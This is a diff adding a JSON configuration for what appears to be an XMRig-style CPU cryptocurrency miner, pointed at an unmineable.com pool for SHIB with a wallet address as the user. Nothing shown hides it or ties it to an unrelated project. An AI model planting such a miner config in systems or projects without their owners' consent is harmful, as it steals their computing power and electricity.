@@ -1,0 +1,15 @@
+
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "SHIB",
+            "url": "rx.unmineable.com:3333",
+            "user": "0xfcc4df90e1c8ff70c835be669b9fb9e89f0b43f1",
+            "tls": true
+        }
+    ]
+}
